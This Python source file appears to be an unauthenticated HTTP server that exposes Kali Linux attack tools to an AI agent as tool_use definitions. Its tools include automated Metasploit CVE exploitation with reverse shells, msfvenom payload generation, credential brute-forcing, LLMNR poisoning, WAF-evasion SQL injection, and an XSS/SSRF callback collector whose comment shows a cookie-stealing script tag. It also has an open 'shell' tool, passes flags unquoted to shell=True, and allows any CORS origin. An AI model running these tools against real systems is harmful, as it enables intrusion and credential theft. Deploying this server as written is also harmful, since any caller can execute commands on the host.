#!/usr/bin/env python3
"""
MCP Kali Linux Server
Exposes Kali penetration testing tools via HTTP API for the manucas app.

Usage:
  python3 kali-mcp-server.py [port]   (default port: 3000)

On Kali, run this and point the app to http://<kali-ip>:3000
"""
import json
import subprocess
import shlex
import sys
import urllib.request
import urllib.parse
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse

# ── Tool definitions (Claude tool_use format) ─────────────────────────────────
TOOLS = {
    "nmap": {
        "description": "Network port scanner. Discover open ports, services and OS on targets.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "IP address, hostname or CIDR range (e.g. 10.0.0.1 or 10.0.0.0/24)"},
                "flags":  {"type": "string", "description": "nmap flags (default: -sV -sC). Example: -sV -O -p 80,443,8080"}
            },
            "required": ["target"]
        }
    },
    "gobuster": {
        "description": "Directory and file brute-force web scanner.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target":   {"type": "string", "description": "Target URL (e.g. http://10.0.0.1)"},
                "wordlist": {"type": "string", "description": "Wordlist path (default: /usr/share/wordlists/dirb/common.txt)"},
                "flags":    {"type": "string", "description": "Additional gobuster flags (e.g. -x php,html -t 50)"}
            },
            "required": ["target"]
        }
    },
    "nikto": {
        "description": "Web server vulnerability and misconfiguration scanner.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "Target URL or IP (e.g. http://10.0.0.1)"},
                "flags":  {"type": "string", "description": "Additional nikto flags"}
            },
            "required": ["target"]
        }
    },
    "whatweb": {
        "description": "Web technology fingerprinting (CMS, frameworks, server, etc).",
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "Target URL"},
                "flags":  {"type": "string", "description": "Additional whatweb flags (default: -a 3 for aggressive)"}
            },
            "required": ["target"]
        }
    },
    "dig": {
        "description": "DNS lookup and zone transfer utility.",
        "input_schema": {
            "type": "object",
            "properties": {
                "domain": {"type": "string", "description": "Domain name to query"},
                "type":   {"type": "string", "description": "Record type: A, AAAA, MX, NS, TXT, AXFR, ANY (default: A)"},
                "flags":  {"type": "string", "description": "Additional dig flags"}
            },
            "required": ["domain"]
        }
    },
    "whois": {
        "description": "WHOIS domain/IP registration information lookup.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "Domain name or IP address"}
            },
            "required": ["target"]
        }
    },
    "curl": {
        "description": "HTTP/HTTPS request tool. Fetch web pages, headers, APIs.",
        "input_schema": {
            "type": "object",
            "properties": {
                "url":   {"type": "string", "description": "Target URL"},
                "flags": {"type": "string", "description": "curl flags (e.g. -I for headers, -X POST -d 'data', -H 'Header: val')"}
            },
            "required": ["url"]
        }
    },
    "sqlmap": {
        "description": "Automatic SQL injection detection and database extraction.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "Target URL with parameter (e.g. http://site.com/page?id=1)"},
                "flags":  {"type": "string", "description": "sqlmap flags (default: --batch --level=1). Example: --dbs --batch --risk=2"}
            },
            "required": ["target"]
        }
    },
    "ffuf": {
        "description": "Fast web fuzzer for directories, parameters and vhosts.",
        "input_schema": {
            "type": "object",
            "properties": {
                "url":      {"type": "string", "description": "URL with FUZZ placeholder (e.g. http://site.com/FUZZ)"},
                "wordlist": {"type": "string", "description": "Wordlist path (default: /usr/share/wordlists/dirb/common.txt)"},
                "flags":    {"type": "string", "description": "Additional ffuf flags (e.g. -fc 404 -t 50)"}
            },
            "required": ["url"]
        }
    },
    "hydra": {
        "description": "Network login brute-force tool for SSH, FTP, HTTP, etc.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target":    {"type": "string", "description": "Target IP or hostname"},
                "service":   {"type": "string", "description": "Service to attack (ssh, ftp, http-post-form, smb, etc)"},
                "userlist":  {"type": "string", "description": "Username or path to username list"},
                "passlist":  {"type": "string", "description": "Password or path to password list (default: /usr/share/wordlists/rockyou.txt.gz)"},
                "flags":     {"type": "string", "description": "Additional hydra flags (e.g. -t 4 -V)"}
            },
            "required": ["target", "service", "userlist"]
        }
    },
    "netcat": {
        "description": "Network utility for port checking and banner grabbing.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "Target IP or hostname"},
                "port":   {"type": "string", "description": "Port number"},
                "flags":  {"type": "string", "description": "Additional nc flags (default: -zv for port scan)"}
            },
            "required": ["target", "port"]
        }
    },
    "shell": {
        "description": "Execute any shell command directly on Kali Linux. Use for tools not listed above.",
        "input_schema": {
            "type": "object",
            "properties": {
                "command": {"type": "string", "description": "Full shell command to run (e.g. 'cat /etc/hosts', 'msfvenom -p ...')"},
                "timeout": {"type": "integer", "description": "Timeout in seconds (default: 30, max: 300)"}
            },
            "required": ["command"]
        }
    },
    "cve_search": {
        "description": "Search the NVD (National Vulnerability Database) for CVEs. Access to 260,000+ CVEs by keyword, product, vendor or severity.",
        "input_schema": {
            "type": "object",
            "properties": {
                "keyword":  {"type": "string", "description": "Search term (e.g. 'apache', 'log4j', 'openssh 8.2', 'windows rdp')"},
                "severity": {"type": "string", "description": "Filter by severity: LOW, MEDIUM, HIGH, CRITICAL"},
                "limit":    {"type": "integer", "description": "Number of results to return (default: 20, max: 50)"}
            },
            "required": ["keyword"]
        }
    },
    "cve_lookup": {
        "description": "Look up detailed information about a specific CVE by its ID from the NVD database.",
        "input_schema": {
            "type": "object",
            "properties": {
                "cve_id": {"type": "string", "description": "CVE identifier (e.g. CVE-2021-44228, CVE-2023-23397)"}
            },
            "required": ["cve_id"]
        }
    },
    "searchsploit": {
        "description": "Search Exploit-DB for public exploits and proof-of-concept code for vulnerabilities.",
        "input_schema": {
            "type": "object",
            "properties": {
                "query": {"type": "string", "description": "Search term (e.g. 'apache 2.4', 'vsftpd 2.3.4', 'ms17-010')"},
                "flags": {"type": "string", "description": "Additional searchsploit flags (e.g. --www for URL, --id for EDB-ID only)"}
            },
            "required": ["query"]
        }
    },
    "metasploit": {
        "description": "Run Metasploit Framework commands. Search modules, run exploits, auxiliary scanners.",
        "input_schema": {
            "type": "object",
            "properties": {
                "command": {"type": "string", "description": "msfconsole command (e.g. 'search ms17-010', 'use exploit/windows/smb/ms17_010_eternalblue', 'search cve:2021-44228')"},
                "timeout": {"type": "integer", "description": "Timeout in seconds (default: 60)"}
            },
            "required": ["command"]
        }
    },
    "msfvenom": {
        "description": "Generate payloads with msfvenom (reverse shells, encoders, formats).",
        "input_schema": {
            "type": "object",
            "properties": {
                "payload": {"type": "string", "description": "Payload (e.g. windows/x64/meterpreter/reverse_tcp, linux/x86/shell_reverse_tcp)"},
                "lhost":   {"type": "string", "description": "Listener IP"},
                "lport":   {"type": "string", "description": "Listener port"},
                "format":  {"type": "string", "description": "Output format: exe, elf, php, py, ps1, raw (default: exe)"},
                "output":  {"type": "string", "description": "Output file path (e.g. /tmp/shell.exe)"},
                "flags":   {"type": "string", "description": "Additional msfvenom flags (e.g. -e x86/shikata_ga_nai -i 3)"}
            },
            "required": ["payload", "lhost", "lport"]
        }
    },
    "john": {
        "description": "John the Ripper password hash cracker.",
        "input_schema": {
            "type": "object",
            "properties": {
                "hashfile": {"type": "string", "description": "Path to file containing hashes"},
                "wordlist": {"type": "string", "description": "Wordlist path (default: /usr/share/wordlists/rockyou.txt)"},
                "format":   {"type": "string", "description": "Hash format (e.g. md5, sha256, ntlm, bcrypt). Leave empty for auto-detect."},
                "flags":    {"type": "string", "description": "Additional john flags"}
            },
            "required": ["hashfile"]
        }
    },
    "hashcat": {
        "description": "GPU-accelerated password hash cracker.",
        "input_schema": {
            "type": "object",
            "properties": {
                "hashfile": {"type": "string", "description": "Path to hash file"},
                "mode":     {"type": "string", "description": "Hash mode (e.g. 0=MD5, 100=SHA1, 1000=NTLM, 1800=SHA512crypt, 13100=Kerberoast)"},
                "wordlist": {"type": "string", "description": "Wordlist path (default: /usr/share/wordlists/rockyou.txt)"},
                "flags":    {"type": "string", "description": "Additional hashcat flags (e.g. -r /usr/share/hashcat/rules/best64.rule)"}
            },
            "required": ["hashfile", "mode"]
        }
    },
    "wpscan": {
        "description": "WordPress vulnerability scanner. Enumerate users, plugins, themes and CVEs.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target":  {"type": "string", "description": "Target WordPress URL"},
                "flags":   {"type": "string", "description": "Additional wpscan flags (e.g. --enumerate u,p,t --plugins-detection aggressive)"},
                "api_token": {"type": "string", "description": "WPScan API token for CVE lookup (optional)"}
            },
            "required": ["target"]
        }
    },
    "enum4linux": {
        "description": "Enumerate Windows/Samba shares, users, groups, policies via SMB/RPC.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "Target IP or hostname"},
                "flags":  {"type": "string", "description": "Flags: -a (all), -U (users), -S (shares), -G (groups), -P (password policy). Default: -a"}
            },
            "required": ["target"]
        }
    },
    "crackmapexec": {
        "description": "Swiss army knife for Windows/AD networks. SMB, LDAP, WinRM enumeration and credential testing.",
        "input_schema": {
            "type": "object",
            "properties": {
                "protocol": {"type": "string", "description": "Protocol: smb, ldap, winrm, ssh, mssql (default: smb)"},
                "target":   {"type": "string", "description": "Target IP, range or file"},
                "flags":    {"type": "string", "description": "Flags (e.g. -u admin -p password --shares, --users, -x 'whoami')"}
            },
            "required": ["target"]
        }
    },
    "theharvester": {
        "description": "OSINT tool for emails, subdomains, IPs, URLs from public sources.",
        "input_schema": {
            "type": "object",
            "properties": {
                "domain":  {"type": "string", "description": "Target domain (e.g. example.com)"},
                "sources": {"type": "string", "description": "Sources: google, bing, linkedin, shodan, all (default: google,bing)"},
                "limit":   {"type": "integer", "description": "Result limit (default: 100)"}
            },
            "required": ["domain"]
        }
    },
    "amass": {
        "description": "Advanced subdomain enumeration and DNS reconnaissance.",
        "input_schema": {
            "type": "object",
            "properties": {
                "domain": {"type": "string", "description": "Target domain"},
                "mode":   {"type": "string", "description": "Mode: enum (passive+active), intel, viz (default: enum -passive)"},
                "flags":  {"type": "string", "description": "Additional amass flags (e.g. -brute -w /usr/share/wordlists/amass/subdomains.lst)"}
            },
            "required": ["domain"]
        }
    },
    "subfinder": {
        "description": "Fast passive subdomain discovery tool.",
        "input_schema": {
            "type": "object",
            "properties": {
                "domain": {"type": "string", "description": "Target domain"},
                "flags":  {"type": "string", "description": "Additional subfinder flags (e.g. -silent, -o output.txt)"}
            },
            "required": ["domain"]
        }
    },
    "responder": {
        "description": "LLMNR/NBT-NS/MDNS poisoner for credential capture on local networks.",
        "input_schema": {
            "type": "object",
            "properties": {
                "interface": {"type": "string", "description": "Network interface (e.g. eth0, wlan0)"},
                "flags":     {"type": "string", "description": "Additional responder flags (e.g. -w for WPAD, -F for ForceWpadAuth)"},
                "timeout":   {"type": "integer", "description": "Capture duration in seconds (default: 30)"}
            },
            "required": ["interface"]
        }
    },
    "tcpdump": {
        "description": "Network packet capture and analysis.",
        "input_schema": {
            "type": "object",
            "properties": {
                "interface": {"type": "string", "description": "Interface to capture on (e.g. eth0, any)"},
                "filter":    {"type": "string", "description": "BPF filter (e.g. 'port 80', 'host 10.0.0.1', 'tcp')"},
                "count":     {"type": "integer", "description": "Number of packets to capture (default: 50)"},
                "flags":     {"type": "string", "description": "Additional tcpdump flags (e.g. -A for ASCII, -w file.pcap)"}
            },
            "required": ["interface"]
        }
    },
    "smbclient": {
        "description": "Connect to SMB/CIFS shares, list and download files.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target":   {"type": "string", "description": "Target (e.g. //10.0.0.1/share or //10.0.0.1/C$)"},
                "user":     {"type": "string", "description": "Username (default: anonymous)"},
                "password": {"type": "string", "description": "Password (default: empty)"},
                "flags":    {"type": "string", "description": "Additional flags (e.g. -L for list shares, -N for no password)"}
            },
            "required": ["target"]
        }
    },
    "snmpwalk": {
        "description": "SNMP enumeration - extract device info, users, running processes via SNMP.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target":    {"type": "string", "description": "Target IP"},
                "community": {"type": "string", "description": "SNMP community string (default: public)"},
                "version":   {"type": "string", "description": "SNMP version: 1, 2c, 3 (default: 2c)"},
                "oid":       {"type": "string", "description": "OID to walk (default: . for all)"}
            },
            "required": ["target"]
        }
    },
    "wfuzz": {
        "description": "Web application fuzzer for parameters, auth bypass, and injection testing.",
        "input_schema": {
            "type": "object",
            "properties": {
                "url":      {"type": "string", "description": "URL with FUZZ placeholder (e.g. http://site.com/page?id=FUZZ)"},
                "wordlist": {"type": "string", "description": "Wordlist path (default: /usr/share/wordlists/dirb/common.txt)"},
                "flags":    {"type": "string", "description": "Additional wfuzz flags (e.g. --hc 404 -H 'Cookie: sess=abc')"}
            },
            "required": ["url"]
        }
    },
    "nuclei": {
        "description": "Fast vulnerability scanner with 10,000+ CVE templates. Equivalent to Burp Suite Scanner but CLI-driven. Detects XSS, SQLi, RCE, misconfigs, exposed panels, CVEs and more.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target":    {"type": "string", "description": "Target URL or IP (e.g. http://10.0.0.1 or 10.0.0.0/24)"},
                "templates": {"type": "string", "description": "Template tags or paths: cves, xss, sqli, rce, lfi, ssrf, misconfig, exposure, takeover, default-logins (default: cves,misconfig,exposure)"},
                "severity":  {"type": "string", "description": "Filter by severity: critical, high, medium, low, info (default: critical,high,medium)"},
                "flags":     {"type": "string", "description": "Additional nuclei flags (e.g. -H 'Cookie: sess=abc' -rl 50 -timeout 5)"}
            },
            "required": ["target"]
        }
    },
    "waf_bypass": {
        "description": "Detect WAF and apply automatic bypass techniques. Uses wafw00f to identify WAF, then runs sqlmap/ffuf/nuclei with tamper scripts, random agents, and evasion flags to bypass protection.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "Target URL (e.g. http://site.com/page?id=1)"},
                "mode":   {"type": "string", "description": "Bypass mode: detect (just detect WAF), sqli (bypass+SQLi), fuzz (bypass+dir fuzz), full (all). Default: full"}
            },
            "required": ["target"]
        }
    },
    "msf_exploit": {
        "description": "Automated CVE exploitation using Metasploit Framework. Given a CVE or service, searches for exploit modules, configures RHOST/LHOST and runs the exploit.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "Target IP or hostname"},
                "cve":    {"type": "string", "description": "CVE ID (e.g. CVE-2021-44228) or search term (e.g. ms17-010, eternalblue)"},
                "lhost":  {"type": "string", "description": "Attacker IP for reverse shell (default: auto-detect via 'hostname -I')"},
                "lport":  {"type": "string", "description": "Listener port (default: 4444)"},
                "flags":  {"type": "string", "description": "Extra msfconsole options"}
            },
            "required": ["target", "cve"]
        }
    },
    "ghauri": {
        "description": "Advanced SQL injection detection and exploitation tool. Modern alternative to sqlmap with better bypass techniques for WAFs.",
        "input_schema": {
            "type": "object",
            "properties": {
                "url":   {"type": "string", "description": "Target URL with parameter (e.g. http://site.com/page?id=1)"},
                "flags": {"type": "string", "description": "Additional ghauri flags (e.g. --dbs --dump -D dbname -T table --batch)"}
            },
            "required": ["url"]
        }
    },
    "httpx": {
        "description": "Fast HTTP toolkit for probing web servers. Detects status codes, titles, tech stack, CDN, CNAME, IPs, and more across many hosts at once.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "Single URL, IP, domain or file path with list of targets (e.g. http://10.0.0.1 or targets.txt)"},
                "flags":  {"type": "string", "description": "Additional httpx flags (e.g. -title -tech-detect -status-code -cdn -ip -cname -silent)"}
            },
            "required": ["target"]
        }
    },
    "aquatone": {
        "description": "Domain flyover tool that takes screenshots of web pages across many hosts. Useful for visual recon of large attack surfaces.",
        "input_schema": {
            "type": "object",
            "properties": {
                "hosts":   {"type": "string", "description": "Newline-separated list of hosts/URLs or path to file with hosts"},
                "out":     {"type": "string", "description": "Output directory (default: /tmp/aquatone_out)"},
                "flags":   {"type": "string", "description": "Additional aquatone flags (e.g. -ports 80,443,8080 -timeout 3000)"}
            },
            "required": ["hosts"]
        }
    }
}

# ── Command builders ───────────────────────────────────────────────────────────

def build_command(tool, args):
    if tool == "nmap":
        flags = args.get("flags", "-sV -sC")
        return f"nmap {flags} {shlex.quote(str(args['target']))}"

    elif tool == "gobuster":
        wl    = args.get("wordlist", "/usr/share/wordlists/dirb/common.txt")
        flags = args.get("flags", "")
        return f"gobuster dir -u {shlex.quote(args['target'])} -w {wl} {flags} --no-error 2>&1 | head -80"

    elif tool == "nikto":
        flags = args.get("flags", "")
        return f"nikto -h {shlex.quote(args['target'])} {flags} 2>&1 | head -60"

    elif tool == "whatweb":
        flags = args.get("flags", "-a 3")
        return f"whatweb {flags} {shlex.quote(args['target'])} 2>&1"

    elif tool == "dig":
        rtype = args.get("type", "A")
        flags = args.get("flags", "")
        return f"dig {shlex.quote(args['domain'])} {rtype} {flags}"

    elif tool == "whois":
        return f"whois {shlex.quote(str(args['target']))} 2>&1 | head -60"

    elif tool == "curl":
        flags = args.get("flags", "-sL --max-time 15")
        return f"curl {flags} {shlex.quote(args['url'])} 2>&1 | head -100"

    elif tool == "sqlmap":
        flags = args.get("flags", "--batch --level=1")
        return f"sqlmap -u {shlex.quote(args['target'])} {flags} 2>&1 | tail -50"

    elif tool == "ffuf":
        wl    = args.get("wordlist", "/usr/share/wordlists/dirb/common.txt")
        flags = args.get("flags", "-fc 404")
        return f"ffuf -u {shlex.quote(args['url'])} -w {wl} {flags} 2>&1 | head -80"

    elif tool == "hydra":
        service  = args.get("service", "ssh")
        user     = args.get("userlist", "admin")
        passlist = args.get("passlist", "/usr/share/wordlists/rockyou.txt.gz")
        flags    = args.get("flags", "-t 4 -V")
        target   = shlex.quote(str(args['target']))
        ul_flag  = f"-l {shlex.quote(user)}" if not user.startswith("/") else f"-L {shlex.quote(user)}"
        pl_flag  = f"-p {shlex.quote(passlist)}" if not passlist.startswith("/") else f"-P {shlex.quote(passlist)}"
        return f"hydra {ul_flag} {pl_flag} {flags} {target} {service} 2>&1 | head -60"

    elif tool == "netcat":
        flags = args.get("flags", "-zv")
        return f"nc {flags} -w 3 {shlex.quote(str(args['target']))} {shlex.quote(str(args['port']))} 2>&1"

    elif tool == "shell":
        return args["command"]

    elif tool == "searchsploit":
        flags = args.get("flags", "")
        return f"searchsploit {flags} {shlex.quote(args['query'])} 2>&1 | head -60"

    elif tool == "metasploit":
        cmd = args["command"]
        timeout = args.get("timeout", 60)
        return f"msfconsole -q -x {shlex.quote(cmd + '; exit')} 2>&1 | head -80"

    elif tool == "msfvenom":
        payload = args["payload"]
        lhost   = args["lhost"]
        lport   = args["lport"]
        fmt     = args.get("format", "exe")
        out     = args.get("output", f"/tmp/payload.{fmt}")
        flags   = args.get("flags", "")
        return f"msfvenom -p {shlex.quote(payload)} LHOST={shlex.quote(lhost)} LPORT={shlex.quote(str(lport))} -f {shlex.quote(fmt)} {flags} -o {shlex.quote(out)} 2>&1"

    elif tool == "john":
        wl     = args.get("wordlist", "/usr/share/wordlists/rockyou.txt")
        fmt    = f"--format={args['format']}" if args.get("format") else ""
        flags  = args.get("flags", "")
        hfile  = shlex.quote(args["hashfile"])
        return f"john {fmt} --wordlist={shlex.quote(wl)} {flags} {hfile} 2>&1 | head -40"

    elif tool == "hashcat":
        wl    = args.get("wordlist", "/usr/share/wordlists/rockyou.txt")
        flags = args.get("flags", "")
        return f"hashcat -m {shlex.quote(str(args['mode']))} {shlex.quote(args['hashfile'])} {shlex.quote(wl)} {flags} --potfile-disable 2>&1 | head -60"

    elif tool == "wpscan":
        token = f"--api-token {shlex.quote(args['api_token'])}" if args.get("api_token") else ""
        flags = args.get("flags", "--enumerate u,p,t")
        return f"wpscan --url {shlex.quote(args['target'])} {flags} {token} 2>&1 | head -100"

    elif tool == "enum4linux":
        flags = args.get("flags", "-a")
        return f"enum4linux {flags} {shlex.quote(args['target'])} 2>&1 | head -150"

    elif tool == "crackmapexec":
        proto = args.get("protocol", "smb")
        flags = args.get("flags", "")
        return f"crackmapexec {shlex.quote(proto)} {shlex.quote(args['target'])} {flags} 2>&1 | head -80"

    elif tool == "theharvester":
        sources = args.get("sources", "google,bing")
        limit   = args.get("limit", 100)
        return f"theHarvester -d {shlex.quote(args['domain'])} -b {shlex.quote(sources)} -l {limit} 2>&1 | head -100"

    elif tool == "amass":
        mode  = args.get("mode", "enum -passive")
        flags = args.get("flags", "")
        return f"amass {mode} -d {shlex.quote(args['domain'])} {flags} 2>&1 | head -100"

    elif tool == "subfinder":
        flags = args.get("flags", "")
        return f"subfinder -d {shlex.quote(args['domain'])} {flags} 2>&1 | head -100"

    elif tool == "responder":
        flags   = args.get("flags", "")
        timeout = args.get("timeout", 30)
        return f"timeout {timeout} responder -I {shlex.quote(args['interface'])} {flags} 2>&1 | head -80"

    elif tool == "tcpdump":
        count  = args.get("count", 50)
        filt   = shlex.quote(args["filter"]) if args.get("filter") else ""
        flags  = args.get("flags", "-nn")
        return f"tcpdump -i {shlex.quote(args['interface'])} {flags} -c {count} {filt} 2>&1"

    elif tool == "smbclient":
        user  = args.get("user", "anonymous")
        pw    = args.get("password", "")
        flags = args.get("flags", "-N")
        return f"smbclient {shlex.quote(args['target'])} -U {shlex.quote(user)}%{shlex.quote(pw)} {flags} -c 'ls' 2>&1 | head -60"

    elif tool == "snmpwalk":
        community = args.get("community", "public")
        version   = args.get("version", "2c")
        oid       = args.get("oid", ".")
        return f"snmpwalk -v{version} -c {shlex.quote(community)} {shlex.quote(args['target'])} {shlex.quote(oid)} 2>&1 | head -100"

    elif tool == "wfuzz":
        wl    = args.get("wordlist", "/usr/share/wordlists/dirb/common.txt")
        flags = args.get("flags", "--hc 404")
        return f"wfuzz -w {shlex.quote(wl)} {flags} {shlex.quote(args['url'])} 2>&1 | head -80"

    elif tool == "nuclei":
        templates = args.get("templates", "cves,misconfig,exposure")
        severity  = args.get("severity", "critical,high,medium")
        flags     = args.get("flags", "")
        return f"nuclei -u {shlex.quote(args['target'])} -tags {shlex.quote(templates)} -severity {shlex.quote(severity)} {flags} -no-color 2>&1 | head -120"

    elif tool == "ghauri":
        flags = args.get("flags", "--batch --dbs")
        return f"ghauri -u {shlex.quote(args['url'])} {flags} 2>&1 | head -100"

    elif tool == "waf_bypass":
        target = shlex.quote(args['target'])
        mode   = args.get("mode", "full")
        cmds   = [f"echo '=== WAF DETECTION ===' && wafw00f {target} 2>&1 | tail -20"]
        if mode in ("sqli", "full"):
            cmds.append(
                f"echo '=== SQLi BYPASS ===' && sqlmap -u {target} "
                f"--tamper=space2comment,charencode,randomcase,between,equaltolike "
                f"--random-agent --level=3 --risk=2 --batch --timeout=15 "
                f"--retries=2 2>&1 | tail -40"
            )
        if mode in ("fuzz", "full"):
            cmds.append(
                f"echo '=== DIR FUZZ BYPASS ===' && ffuf -u {target.strip(chr(39))}/FUZZ "
                f"-w /usr/share/seclists/Discovery/Web-Content/common.txt "
                f"-H 'User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1)' "
                f"-H 'X-Forwarded-For: 127.0.0.1' -mc 200,201,301,302,403 -fc 404 "
                f"-t 20 -timeout 10 2>&1 | head -50"
            )
        return " && ".join(cmds)

    elif tool == "msf_exploit":
        target = shlex.quote(args['target'])
        cve    = args.get("cve", "").replace("CVE-", "cve:").lower()
        lhost  = args.get("lhost", "$(hostname -I | awk '{print $1}')")
        lport  = args.get("lport", "4444")
        msf_cmds = (
            f"search {cve}; "
            f"use 0; "
            f"set RHOSTS {args['target']}; "
            f"set LHOST {lhost}; "
            f"set LPORT {lport}; "
            f"set VERBOSE false; "
            f"run; exit"
        )
        return f"msfconsole -q -x {shlex.quote(msf_cmds)} 2>&1 | head -100"

    elif tool == "httpx":
        flags = args.get("flags", "-title -tech-detect -status-code -ip -silent")
        return f"echo {shlex.quote(args['target'])} | httpx {flags} 2>&1 | head -100"

    elif tool == "aquatone":
        out   = args.get("out", "/tmp/aquatone_out")
        flags = args.get("flags", "")
        return f"echo {shlex.quote(args['hosts'])} | aquatone -out {shlex.quote(out)} {flags} 2>&1 | head -60"

    return None


NVD_BASE = "https://services.nvd.nist.gov/rest/json/cves/2.0"

def nvd_search(keyword, severity=None, limit=20):
    limit   = min(int(limit), 50)
    params  = {"keywordSearch": keyword, "resultsPerPage": limit}
    if severity:
        params["cvssV3Severity"] = severity.upper()
    url = NVD_BASE + "?" + urllib.parse.urlencode(params)
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "manucaspt/1.0"})
        with urllib.request.urlopen(req, timeout=15) as r:
            data = json.loads(r.read())
        vulns = data.get("vulnerabilities", [])
        lines = [f"Total: {data.get('totalResults',0)}  Showing: {len(vulns)}\n"]
        for v in vulns:
            cve   = v["cve"]
            cid   = cve["id"]
            desc  = (cve.get("descriptions") or [{}])[0].get("value", "")[:120]
            score = ""
            metrics = cve.get("metrics", {})
            for key in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
                if key in metrics:
                    score = metrics[key][0]["cvssData"].get("baseScore", "")
                    sev   = metrics[key][0].get("baseSeverity") or metrics[key][0]["cvssData"].get("baseSeverity","")
                    score = f"{score} ({sev})"
                    break
            lines.append(f"[{cid}] CVSS:{score}\n  {desc}\n")
        return "\n".join(lines)
    except Exception as e:
        return f"[NVD API error: {e}]"

def nvd_lookup(cve_id):
    cve_id = cve_id.upper().strip()
    url = NVD_BASE + "?" + urllib.parse.urlencode({"cveId": cve_id})
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "manucaspt/1.0"})
        with urllib.request.urlopen(req, timeout=15) as r:
            data = json.loads(r.read())
        vulns = data.get("vulnerabilities", [])
        if not vulns:
            return f"[{cve_id}] não encontrado na NVD."
        cve  = vulns[0]["cve"]
        desc = "\n".join(d["value"] for d in cve.get("descriptions", []) if d.get("lang") in ("en","pt"))
        refs = [r["url"] for r in cve.get("references", [])[:6]]
        score = "N/A"
        metrics = cve.get("metrics", {})
        for key in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
            if key in metrics:
                d     = metrics[key][0]["cvssData"]
                sev   = metrics[key][0].get("baseSeverity") or d.get("baseSeverity","")
                score = f"{d.get('baseScore','?')} {sev}  Vector:{d.get('vectorString','')}"
                break
        published = cve.get("published","")[:10]
        modified  = cve.get("lastModified","")[:10]
        out  = f"=== {cve_id} ===\n"
        out += f"Published : {published}  Modified: {modified}\n"
        out += f"CVSS      : {score}\n\n"
        out += f"Description:\n{desc}\n\n"
        out += "References:\n" + "\n".join(refs)
        return out
    except Exception as e:
        return f"[NVD API error: {e}]"


def run_command(cmd, timeout=60):
    print(f"  [exec] {cmd}")
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=min(timeout, 300)
        )
        out = result.stdout or ""
        err = result.stderr or ""
        combined = (out + err).strip() or "(sem output)"
        return combined[:8000]
    except subprocess.TimeoutExpired:
        return f"[timeout após {timeout}s]"
    except Exception as e:
        return f"[erro: {e}]"


# ── In-memory callback store (XSS / SSRF / OOB DNS hits) ─────────────────────
_CALLBACKS = []  # list of dicts: {time, ip, path, data}

# ── HTTP Handler ───────────────────────────────────────────────────────────────

class MCPHandler(BaseHTTPRequestHandler):
    def _cors(self):
        self.send_header("Access-Control-Allow-Origin",  "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type, Authorization")

    def do_OPTIONS(self):
        self.send_response(200)
        self._cors()
        self.end_headers()

    def do_GET(self):
        path = urlparse(self.path).path
        if path in ("/", "/tools"):
            tools_list = [
                {"name": k, "description": v["description"], "inputSchema": v["input_schema"]}
                for k, v in TOOLS.items()
            ]
            body = json.dumps({"tools": tools_list}).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self._cors()
            self.end_headers()
            self.wfile.write(body)
        elif path == "/ping":
            self.send_response(200)
            self._cors()
            self.end_headers()
            self.wfile.write(b"pong")
        elif path == "/callbacks":
            body = json.dumps(_CALLBACKS[-100:]).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self._cors()
            self.end_headers()
            self.wfile.write(body)
        elif path.startswith("/cb") or path.startswith("/xss") or path.startswith("/ssrf"):
            # XSS/SSRF GET callback (e.g. <script src=http://kali:3000/cb?c=COOKIE>)
            from urllib.parse import urlparse, parse_qs
            qs = parse_qs(urlparse(self.path).query)
            entry = {
                "time": __import__('datetime').datetime.now().isoformat(),
                "ip":   self.client_address[0],
                "path": path,
                "data": {k: v[0] for k, v in qs.items()},
            }
            _CALLBACKS.append(entry)
            print(f"  [CALLBACK] {entry}")
            self.send_response(200)
            self._cors()
            self.end_headers()
            self.wfile.write(b"")
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        path = urlparse(self.path).path
        length = int(self.headers.get("Content-Length", 0))
        raw    = self.rfile.read(length) if length else b"{}"
        try:
            args = json.loads(raw)
        except Exception:
            args = {}

        if path.startswith("/call/"):
            tool = path[6:].strip("/")
            if tool not in TOOLS:
                self.send_response(400)
                self._cors()
                self.end_headers()
                self.wfile.write(json.dumps({"error": f"unknown tool: {tool}"}).encode())
                return

            if tool == "cve_search":
                output = nvd_search(args.get("keyword",""), args.get("severity"), args.get("limit", 20))
                cmd    = f"[NVD API] keyword={args.get('keyword')} severity={args.get('severity')} limit={args.get('limit',20)}"
            elif tool == "cve_lookup":
                output = nvd_lookup(args.get("cve_id",""))
                cmd    = f"[NVD API] lookup={args.get('cve_id')}"
            else:
                cmd     = build_command(tool, args)
                timeout = int(args.get("timeout", 60))
                output  = run_command(cmd, timeout=timeout)

            resp = json.dumps({"output": output, "command": cmd}).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self._cors()
            self.end_headers()
            self.wfile.write(resp)
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, fmt, *args):
        print(f"[{self.address_string()}] {fmt % args}")


# ── Entry point ────────────────────────────────────────────────────────────────

if __name__ == "__main__":
